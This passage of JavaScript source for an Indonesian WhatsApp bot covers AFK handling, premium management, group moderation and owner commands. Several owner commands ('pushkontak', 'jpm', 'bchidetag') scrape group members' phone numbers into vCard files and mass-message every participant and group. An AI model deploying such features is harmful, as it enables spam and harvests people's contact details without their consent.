            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    newReply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./src/data/user/afk-user.json', JSON.stringify(_afk))
                ndaa.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk`, m)
            }
        }
        switch (isCommand) {
            case 'autosimi':
               if (!isCreator) return newReply(mess.owne)
               if (args.length < 1) return newReply('perilah apa?')
               if (q == 'on') {
                  autosimi.push(from)
                  fs.writeFileSync('./src/data/simi.json', JSON.stringify(autosimi))
                  newReply('Sukses mengaktifkan mode simi')
               } else if (q == 'off') {
                  autosimi.splice(from, 1)
                  fs.writeFileSync('./src/data/simi.json', JSON.stringify(autosimi))
                  newReply('Sukes menonaktifkan mode simi')
               } else {
                  newReply('Agak Laen')
               }
            break
            case 'setimgqouted':
            case 'siq': {
                if (!isCreator) return newReply(mess.owner)
                let delb = await ndaa.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './media/quoted.jpg')
                fs.unlinkSync(delb)
                newReply(mess.done)
            }
            break
            case 'setimgmenu':
            case 'sim': {
                if (!isCreator) return newReply(mess.owner)
                let delb = await ndaa.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './media/menu.jpg')
                fs.unlinkSync(delb)
                newReply(mess.done)
            }
            break
            case 'setvidmenu':
            case 'svm': {
                if (!isCreator) return newReply(mess.owner)
                let delb = await ndaa.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './media/menu.mp4')
                fs.unlinkSync(delb)
                newReply(mess.done)
            }
            break
            case 'setmenu':
                if (!isCreator) return newReply(mess.owner)
                if (!q) return newReply(`Mau Pilih Yang Mana?\n1. v1 (Image ORI)\n2. v2 (Image Kece)\n3. v3 (Video GIF)\n4. v4 (Doc Pdf)\n5. v5 (Call)\n6. v6 (Store)`)
                global.typemenu = `'${q}'`
                newReply(mess.done)
                break
            case 'addprem':
                if (!isCreator) return newReply(mess.owner)
                if (args.length < 2)
                    return newReply(`Penggunaan :\n*#addprem* @tag waktu\n*#addprem* nomor waktu\n\nContoh : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    newReply("Sukses Premium")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    newReply("Sukses Via Nomer")
                }
                break
            case 'delprem':
                if (!isCreator) return newReply(mess.owner)
                if (args.length < 1) return newReply(`Penggunaan :\n*#delprem* @tag\n*#delprem* nomor`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./src/data/premium.json", JSON.stringify(premium));
                    }
                    newReply("Sukses Delete")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./src/data/premium.json", JSON.stringify(premium));
                    newReply("Sukses Via Nomer")
                }
                break
            case 'listprem': {
                if (!isCreator) return newReply(mess.owner)
                let data = require("./src/data/premium.json")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Nomer : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`         
                }                
                ndaa.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: ftroli
                })
            }
            break
            case 'delsesi':
            case 'clearsession': {
                if (!isCreator) return newReply(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return newReply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
                    if (filteredArray.length == 0) return newReply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    newReply(teks)
                    await sleep(2000)
                    newReply("Menghapus file sampah...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    newReply("Berhasil menghapus semua sampah di folder session")
                });
            }    
            break
            case "cekidgc": {
if (!isCreator) return newReply(`Jir Lu Siapa Cok`)
let getGroups = await ndaa.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP MU*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await ndaa.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
newReply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break

case "pushkontak":{
if (!isCreator) return newReply(`Jir Lu Siapa Cok`)
if (isGroup) return newReply(`Khusus Di Chat Prib Bwang`)
if (!text) return newReply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
newReply(mess.wait)
const groupMetadataa = !m.isGroup? await ndaa.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await ndaa.downloadAndSaveMediaMessage(quoted)
memk = await TelegraPh(media)
await ndaa.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await ndaa.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
newReply(util.format(err))
} finally {
await ndaa.sendMessage(from, { document: fs.readFileSync("./.netdatabase/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save Aja Ke Kontak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break

case "pushkontakv2":{
if (!isCreator) return newReply(`Jir Lu Siapa Cok`)
if (!isGroup) return newReply(`Khusus Di Dalam Grup Jirr`)
if (!text) return newReply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
newReply(mess.wait)
const groupMetadata = m.isGroup? await ndaa.groupMetadata(from).catch(e => {}) : ""
const groupOwner = m.isGroup? groupMetadata.owner : ""
const participantts = m.isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await ndaa.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await ndaa.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(1000)
} else {
await ndaa.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(1000)
}
}
newReply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
newReply(util.format(err))
} finally {
await ndaa.sendMessage(sender, { document: fs.readFileSync("./media/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save Ke Kontak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
            case 'bcgc': case 'jpm': {
if (!isCreator) return newReply('Lu Siapa?')
if (!text) throw `Text mana?\n\nExample : ${prefix + command} Need Vps? Cet ndaa`
let getGroups = await ndaa.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
newReply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
ndaa.sendMessage(i, {text: `${text}`}, {quoted:ftroli})
    }
newReply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case "bchidetag": case "bchide": {
if (!isCreator) return newReply(`Jir Lu Siapa Cok`)
if (!text) return newReply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
let getGroups = await ndaa.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await ndaa.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await ndaa.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await ndaa.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await ndaa.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
newReply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case "bcimg": case "jpm3": {
if (!isCreator) return newReply(`Lu ndaa Kah?`)
if (!text) return newReply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
let getGroups = await ndaa.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
if (/image/.test(mime)) {
media = await ndaa.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await ndaa.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0] })
await sleep(text.split('|')[1])
} else {
await ndaa.sendMessage(xnxx, { text: text.split('|')[0] })
await sleep(text.split('|')[1])
}}
newReply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
            case 'join':
                try {
                    if (!isCreator) return newReply(mess.owner)
                    if (!text) return newReply('Masukkan Link Group!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return newReply('Link Invalid!')
                    newReply(mess.wait)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await ndaa.groupAcceptInvite(result).then((res) => newReply(json(res))).catch((err) => newReply(json(err)))
                } catch {
                    newReply('Gagal Masuk Ke Group')
                }
                break
            case 'cekapikey':
                if (!isCreator) return newReply(mess.owner)
                let urll = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${lol}`)
                newReply(urll.result)
                break
            case 'ambilsesi':
            case 'getsesi':
                if (!isCreator) return newReply(mess.owner)
                newReply('Tunggu Sebentar, Sedang mengambil file sesi mu')
                let sesi = await fs.readFileSync('./session/creds.json')
                ndaa.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: ftroli
                })
                break
            case 'myip':
            case 'ipbot':
                if (!isCreator) return newReply(mess.owner)
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        newReply("🔎 My public IP address is: " + ip);
                    })
                })
                break
            case 'shutdown':
                if (!isCreator) return newReply(mess.owner)
                newReply(`Otw Restart 🖐`)
                await sleep(3000)
                process.exit()
                break
            case 'autoread':
                if (!isCreator) return newReply(mess.owner)
                if (args.length < 1) return newReply(`Contoh ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    newReply(`Berhasil mengubah autoread ke ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    newReply(`Berhasil mengubah autoread ke ${q}`)
                }
                break
            case 'autobio':
                if (!isCreator) return newReply(mess.owner)
                if (args.length < 1) return newReply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    newReply(`Berhasil Mengubah AutoBio Ke ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    newReply(`Berhasil Mengubah AutoBio Ke ${q}`)
                }
                break
            case 'enc': {
            if (!isCreator) return newReply(mess.owner)
            if (!q) return newReply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
            let meg = await obfus(q)
            newReply(`${meg.result}`)
                }
                break
            case 'mode':
                if (!isCreator) return newReply(mess.owner)
                if (args.length < 1) return newReply(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    ndaa.public = true
                    newReply(mess.done)
                } else if (q == 'self') {
                    ndaa.public = false
                    newReply(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return newReply(mess.owner)
                if (!text) return newReply(`Contoh : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                newReply(`Exif berhasil diubah menjadi\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
            case 'setlink':
                if (!isCreator) return newReply(mess.owner)
                if (!text) return newReply(`Contoh : ${prefix + command} https://youtube.com/@ImNdaa`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                newReply(`Link berhasil diubah menjadi\n\n• Link : ${global.link}`)
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return newReply(mess.owner)
                if (!quoted) return newReply(`Kirim/newReply Image Dengan Caption ${prefix + command}`)
                if (!/image/.test(mime)) return newReply(`Kirim/newReply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return newReply(`Kirim/newReply Image Dengan Caption ${prefix + command}`)
                var medis = await ndaa.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await ndaa.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    newReply(mess.done)
                } else {
                    var memeg = await ndaa.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    newReply(mess.done)
                }
                break
            case 'block':
                if (!isCreator) return newReply(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ndaa.updateBlockStatus(blockw, 'block').then((res) => newReply(json(res))).catch((err) => newReply(json(err)))
                break
            case 'unblock':
                if (!isCreator) return newReply(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ndaa.updateBlockStatus(blockww, 'unblock').then((res) => newReply(json(res))).catch((err) => newReply(json(err)))
                break
            case 'leave':
                if (!isCreator) return newReply(mess.owner)
                if (!m.isGroup) return newReply(mess.group)
                newReply('Dadah Semuanya 🥺')
                await ndaa.groupLeave(m.chat)
                break
            case "backup":
{
if (!isCreator) return newReply("Khusus Owner Anj!!!");
await loading()
          const { execSync } = require("child_process");
          const ls = (await execSync("ls"))
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "node_modules" &&
                pe != "session" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != ""
            );
          const exec = await execSync(`zip -r NewBot.zip ${ls.join(" ")}`);
          await ndaa.sendMessage(
            m.chat,
            {
              document: await fs.readFileSync("./NewBot.zip"),
              mimetype: "application/zip",
              fileName: "NewBot.zip",
            },
            { quoted: ftroli }
          );
          await execSync("rm -rf NewBot.zip");
        }
        break
            case 'getcase':
            case 'ambilcase':
                if (!isCreator) return newReply(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("Ndaa.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                newReply(`${getCase(q)}`)
                break

                /* ~~~~~~~~~ GROUP FEATURES ~~~~~~~~~ */
            case 'delete':
            case 'del': {
                if (!isCreator) return newReply(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return newReply('The message was not sent by a bot!')
                ndaa.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break
            case 'jadianime': {
                if (!isPremium) return newReply(mess.prem)
                if (!isMedia) return newReply("Where The A Image")
                let media = await ndaa.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                await ndaa.sendMessage(m.chat, {
                    image: {
                        url: `https://api.lolhuman.xyz/api/imagetoanime?img=${anu}&apikey=${lol}`
                    },
                    caption: mess.done
                }, {
                    quoted: ftroli
                })
            }
            break
            case 'jadizombie': {
                if (!isPremium) return newReply(mess.prem)
                if (!isMedia) return newReply("Where The A Image")
                let media = await ndaa.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                let data = await fetchJson(`https://api.betabotz.org/api/maker/jadizombie?url=${anu}&apikey=${beta}`)
                await ndaa.sendMessage(m.chat, {
                    image: {
                        url: `${data.result}`
                    },
                    caption: mess.done
                }, {
                    quoted: ftroli
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return newReply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
                }
                newReply(`Close time ${q} dimulai dari sekarang`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
                    ndaa.groupSettingUpdate(m.chat, 'announcement')
                    newReply(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return newReply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
                }
                newReply(`Open time ${q} dimulai dari sekarang`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
                    ndaa.groupSettingUpdate(m.chat, 'not_announcement')
                    newReply(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ndaa.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => newReply(mess.done)).catch((err) => newReply(json(err)))
                break
            case 'add':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ndaa.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => newReply(mess.done)).catch((err) => newReply(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ndaa.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => newReply(mess.done)).catch((err) => newReply(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ndaa.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => newReply(mess.done)).catch((err) => newReply(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                if (!text) return 'Text ?'
                await ndaa.groupUpdateSubject(m.chat, text).then((res) => newReply(mess.done)).catch((err) => newReply(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                if (!text) return 'Text ?'
                await ndaa.groupUpdateDescription(m.chat, text).then((res) => newReply(mess.done)).catch((err) => newReply(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                if (!quoted) return newReply(`Kirim/newReply Image Dengan Caption ${prefix + command}`)
                if (!/image/.test(mime)) return newReply(`Kirim/newReply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return newReply(`Kirim/newReply Image Dengan Caption ${prefix + command}`)
                var medis = await ndaa.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await ndaa.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    newReply(mess.done)
                } else {
                    var memeg = await ndaa.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    newReply(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                let teks = `*👥 Tag All By Admin*
 
                 🗞️ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                ndaa.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: ftroli
                })
                break
            case 'hidetag':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                ndaa.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: ftroli
                })
                break
            case 'totag':
                if (!m.isGroup) return newReply(mess.group)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                if (!isAdmins) return newReply(mess.admin)
                if (!m.quoted) return newReply(`Reply pesan dengan caption ${prefix + command}`)
                ndaa.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                if (args[0] === 'close') {
                    await ndaa.groupSettingUpdate(m.chat, 'announcement').then((res) => newReply(`Sukses Menutup Group 🕊️`)).catch((err) => newReply(json(err)))
                } else if (args[0] === 'open') {
                    await ndaa.groupSettingUpdate(m.chat, 'not_announcement').then((res) => newReply(`Sukses Membuka Group 🕊️`)).catch((err) => newReply(json(err)))
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                if (args[0] === 'open') {
                    await ndaa.groupSettingUpdate(m.chat, 'unlocked').then((res) => newReply(`Sukses Membuka Edit Info Group 🕊️`)).catch((err) => newReply(json(err)))
                } else if (args[0] === 'close') {
                    await ndaa.groupSettingUpdate(m.chat, 'locked').then((res) => newReply(`Sukses Menutup Edit Info Group 🕊️`)).catch((err) => newReply(json(err)))
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
                break
            case 'linkgroup':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                let response = await ndaa.groupInviteCode(m.chat)
                ndaa.sendText(m.chat, `👥 *INFO LINK GROUP*\n📛 *Nama :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Tidak diketahui'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Link Chat :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                await ndaa.groupRevokeInvite(m.chat)
                    .then(res => {
                        newReply(`Sukses Menyetel Ulang, Tautan Undangan Grup ${groupMetadata.subject}`)
                    }).catch((err) => newReply(json(err)))
                break
            case 'listonline':
            case 'liston':
                if (!m.isGroup) newReply(mess.group)
                let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                let online = [...Object.keys(store.presences[id]), botNumber]
                ndaa.sendText(m.chat, '⏰ List Online:\n\n' + online.map(v => '🌱 @' + v.replace(/@.+/, '')).join`\n`, m, {
                    mentions: online
                })
                break


                /* ~~~~~~~~~ MAIN & STATUS BOT ~~~~~~~~~ */
            case 'daftar':
                if (isRegistered) return newReply('Kamu sudah terdaftar')
                if (!q.includes('.')) return newReply(`Format salah!\n\nContoh: ${prefix + command} Ndaa.18`)
                const namaUser = q.substring(0, q.indexOf('.') - 0)
                const umurUser = q.substring(q.lastIndexOf('.') + 1)
                const serialUser = createSerial(20)
                if(isNaN(umurUser)) return newReply('Umur harus berupa angka!!')
                if (namaUser.length >= 30) return newReply(`why is your name so long it's a name or a train`)
                if (umurUser > 40) return newReply(`your age is too  old maximum 40 years`)
                if (umurUser < 12) return newReply(`your age is too young minimum 12 years`)
                let mzd = `Kamu telah terdaftar dengan data sebagai berikut:\n\n⭔ Nama : ${namaUser}\n⭔ Umur : ${umurUser}\n⭔ Nomor : wa.me/${m.sender.split("@")[0]}\n⭔ NS : ${serialUser}`
                if (!m.isGroup) {
                    addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
                    ndaa.sendMessage(m.chat, {
                        text: mzd,
                        contextInfo: {
                            externalAdReply: {
